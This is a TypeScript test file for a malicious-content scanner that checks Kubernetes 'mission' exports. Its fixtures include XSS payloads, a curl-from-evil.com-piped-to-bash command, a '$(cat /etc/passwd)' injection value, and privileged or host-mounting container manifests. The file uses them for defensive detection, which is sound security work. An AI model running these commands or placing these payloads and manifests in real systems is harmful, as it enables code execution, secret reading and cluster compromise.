import { describe, it, expect } from 'vitest'
import {
  scanForMaliciousContent,
  hasMaliciousFindings,
} from '../malicious'
import type { MissionExport } from '../../types'

function makeMission(overrides: Partial<MissionExport> = {}): MissionExport {
  return {
    version: '1.0',
    title: 'Test Mission',
    description: 'A test mission for scanning',
    type: 'troubleshoot',
    tags: ['test'],
    steps: [],
    ...overrides,
  }
}

function makeStep(desc: string, extra: Record<string, string> = {}) {
  return { title: 'Step', description: desc, ...extra }
}

describe('scanForMaliciousContent', () => {
  it('detects XSS script tags', () => {
    const mission = makeMission({
      steps: [makeStep(`<script>alert('xss')</script>`)],
    })
    const findings = scanForMaliciousContent(mission)
    const xss = findings.filter((f) => f.type === 'xss-script')
    expect(xss.length).toBeGreaterThanOrEqual(1)
    expect(xss[0].severity).toBe('critical')
  })

  it('detects XSS javascript URI', () => {
    const mission = makeMission({
      steps: [makeStep('[link](javascript:alert(1))')],
    })
    const findings = scanForMaliciousContent(mission)
    const xss = findings.filter((f) => f.type === 'xss-javascript-uri')
    expect(xss.length).toBeGreaterThanOrEqual(1)
  })

  it('detects XSS event handler', () => {
    const mission = makeMission({
      steps: [makeStep('<img onerror=alert(1)>')],
    })
    const findings = scanForMaliciousContent(mission)
    const xss = findings.filter((f) => f.type === 'xss-event-handler')
    expect(xss.length).toBeGreaterThanOrEqual(1)
  })

  it('detects XSS data URI', () => {
    const mission = makeMission({
      steps: [makeStep('data:text/html,<script>alert(1)</script>')],
    })
    const findings = scanForMaliciousContent(mission)
    const xss = findings.filter((f) => f.type === 'xss-data-uri')
    expect(xss.length).toBeGreaterThanOrEqual(1)
  })

  it('detects XSS SVG with event handler', () => {
    const mission = makeMission({
      steps: [makeStep('<svg onload=alert(1)>')],
    })
    const findings = scanForMaliciousContent(mission)
    const xss = findings.filter((f) => f.type === 'xss-svg')
    expect(xss.length).toBeGreaterThanOrEqual(1)
  })

  it('detects privileged containers', () => {
    const yaml = `spec:
  containers:
    - name: evil
      securityContext:
        privileged: true`
    const mission = makeMission({
      steps: [makeStep('Deploy this', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const priv = findings.filter((f) => f.type === 'privileged-container')
    expect(priv.length).toBeGreaterThanOrEqual(1)
    expect(priv[0].severity).toBe('critical')
  })

  it('does not flag privileged: false', () => {
    const yaml = `spec:
  containers:
    - name: safe
      securityContext:
        privileged: false`
    const mission = makeMission({
      steps: [makeStep('Deploy this', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const priv = findings.filter((f) => f.type === 'privileged-container')
    expect(priv).toHaveLength(0)
  })

  it('detects host network access', () => {
    const yaml = `spec:
  hostNetwork: true`
    const mission = makeMission({
      steps: [makeStep('Deploy with host network', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const host = findings.filter((f) => f.type === 'host-network')
    expect(host.length).toBeGreaterThanOrEqual(1)
  })

  it('detects dangerous hostPath root mount', () => {
    const yaml = `volumes:
  - hostPath:
      path: /
    name: rootfs`
    const mission = makeMission({
      steps: [makeStep('Mount root', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const hp = findings.filter((f) => f.type === 'dangerous-hostpath')
    expect(hp.length).toBeGreaterThanOrEqual(1)
    expect(hp[0].severity).toBe('critical')
  })

  it('detects docker socket mount', () => {
    const yaml = `volumes:
  - hostPath:
      path: /var/run/docker.sock`
    const mission = makeMission({
      steps: [makeStep('Mount docker socket', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const ds = findings.filter((f) => f.type === 'docker-socket')
    expect(ds.length).toBeGreaterThanOrEqual(1)
  })

  it('detects RBAC wildcard permissions', () => {
    const yaml = `rules:
  - apiGroups: [""]
    resources: ["*"]
    verbs: ["*"]`
    const mission = makeMission({
      steps: [makeStep('Apply RBAC', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const rbac = findings.filter((f) => f.type === 'rbac-wildcard')
    expect(rbac.length).toBeGreaterThanOrEqual(1)
  })

  it('does not flag specific RBAC resources and verbs', () => {
    const yaml = `rules:
  - apiGroups: [""]
    resources: ["pods", "services"]
    verbs: ["get", "list", "watch"]`
    const mission = makeMission({
      steps: [makeStep('Apply RBAC', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const rbac = findings.filter((f) => f.type === 'rbac-wildcard')
    expect(rbac).toHaveLength(0)
  })

  it('detects crypto miner references', () => {
    const yaml = `spec:
  containers:
    - image: evil/xmrig-miner:latest`
    const mission = makeMission({
      steps: [makeStep('Deploy', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const miners = findings.filter((f) => f.type === 'crypto-miner')
    expect(miners.length).toBeGreaterThanOrEqual(1)
  })

  it('detects curl piped to bash', () => {
    const mission = makeMission({
      steps: [
        makeStep('Install', {
          command: 'curl http://evil.com/install.sh | bash',
        }),
      ],
    })
    const findings = scanForMaliciousContent(mission)
    const curl = findings.filter((f) => f.type === 'curl-pipe-bash')
    expect(curl.length).toBeGreaterThanOrEqual(1)
  })

  it('detects command injection in yaml fields', () => {
    const yaml = 'value: $(cat /etc/passwd)'
    const mission = makeMission({
      steps: [makeStep('Apply config', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const inj = findings.filter((f) => f.type === 'command-injection')
    expect(inj.length).toBeGreaterThanOrEqual(1)
  })

  it('does not flag backticks in description fields', () => {
    const mission = makeMission({
      steps: [makeStep('Run `kubectl get pods` to see status')],
    })
    const findings = scanForMaliciousContent(mission)
    const inj = findings.filter((f) => f.type === 'command-injection')
    expect(inj).toHaveLength(0)
  })

  it('detects base64-encoded script content', () => {
    // Cross-environment base64 encode (globalThis.btoa works in browsers and Node 16+)
    const encode = (s: string) => globalThis.btoa(s)
    const encoded = encode('<script>alert(1)</script>')
    const mission = makeMission({
      steps: [makeStep(`Encoded payload: ${encoded}`)],
    })
    const findings = scanForMaliciousContent(mission)
    const b64 = findings.filter((f) => f.type === 'base64-encoded-script')
    expect(b64.length).toBeGreaterThanOrEqual(1)
  })

  it('detects URL shortener in yaml manifests', () => {
    const yaml = 'image: bit.ly/malicious-image'
    const mission = makeMission({
      steps: [makeStep('Deploy image', { yaml })],
    })
    const findings = scanForMaliciousContent(mission)
    const url = findings.filter((f) => f.type === 'url-shortener')
    expect(url.length).toBeGreaterThanOrEqual(1)
  })

  it('returns no findings for a clean mission', () => {
    const mission = makeMission({
      steps: [makeStep('Run kubectl get pods')],
    })
    const findings = scanForMaliciousContent(mission)
    expect(findings).toHaveLength(0)
  })

  it('hasMaliciousFindings returns true for critical/high findings', () => {
    const mission = makeMission({
      steps: [makeStep(`<script>alert('xss')</script>`)],
    })
    const findings = scanForMaliciousContent(mission)
    expect(hasMaliciousFindings(findings)).toBe(true)
  })

  it('hasMaliciousFindings returns false for empty findings', () => {
    expect(hasMaliciousFindings([])).toBe(false)
  })
})
